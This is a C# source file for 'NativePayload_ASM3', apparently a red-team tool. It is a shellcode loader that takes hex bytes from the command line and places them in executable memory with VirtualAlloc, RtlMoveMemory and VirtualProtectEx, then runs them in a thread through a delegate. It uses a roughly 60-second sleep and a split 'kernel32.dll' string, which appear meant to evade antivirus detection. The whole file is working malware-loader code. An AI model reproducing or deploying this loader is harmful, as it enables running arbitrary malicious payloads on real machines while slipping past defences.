using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Security;

namespace NativePayload_ASM3
{
    class Program
    {
        public delegate void _Method();
        static void Main(string[] args)
        { 
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_ASM3 , Published by Damon Mohammadbagher , Jan 2023");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_ASM3 Asm Bytes + Thread Injection into local Process + C# Delegation");
            Console.WriteLine();

            MethodBase a;
            new Thread(() =>
           {
               string[] X = args[0].Split(',');
               byte[] _asm_shell = new byte[X.Length];

               for (int i = 0; i < X.Length; i++)
                   _asm_shell[i] = Convert.ToByte(X[i], 16);

               IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)_asm_shell.Length, AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
               System.Threading.Thread.Sleep(60050);
               RtlMoveMemory(ptr, _asm_shell, (uint)_asm_shell.Length);



               Action Exec = () =>
               {
                   _Method myDelegate = (_Method)Marshal.GetDelegateForFunctionPointer(ptr, typeof(_Method));
                   IntPtr ProcessHandle = OpenProcess(0x001F0FFF, false,
                      System.Diagnostics.Process.GetCurrentProcess().Id);
                   //System.Threading.Thread.Sleep(60000);
                   VirtualProtectEx(ProcessHandle, ptr, (UIntPtr)_asm_shell.Length, 0x10, out uint _);
                   //System.Threading.Thread.Sleep(30000);
                   myDelegate();

               };

               Exec.Invoke();

           }).Start();
            
           
            // IntPtr OPS = Exec.GetMethodInfo().MethodHandle.GetFunctionPointer();
            //Console.WriteLine(OPS.ToString("X8"));
            ////object obj = Exec.Method.Module.Assembly.EntryPoint.Invoke(null, null);
            //object obj = Exec.GetMethodInfo().GetRuntimeBaseDefinition().Invoke;

            //MethodInfo.GetMethodFromHandle(.GetFunctionPointer());
            //RuntimeMethodHandle mh = Exec.GetMethodInfo().MethodHandle;
            //IntPtr _P = Exec.GetMethodInfo().MethodHandle.GetFunctionPointer();
            //Console.WriteLine(_P.ToString("X8"));
            //Exec.DynamicInvoke();
            //_Method _myDelegate = (dynamic)Marshal.GetDelegateForFunctionPointer(_P, typeof(_Method));
            //_myDelegate();

            
            Console.ReadKey();
        }
        [DllImport("ke" + "rne" + "l" + "32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("ntdll.dll")]

        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08
        }
    }
}
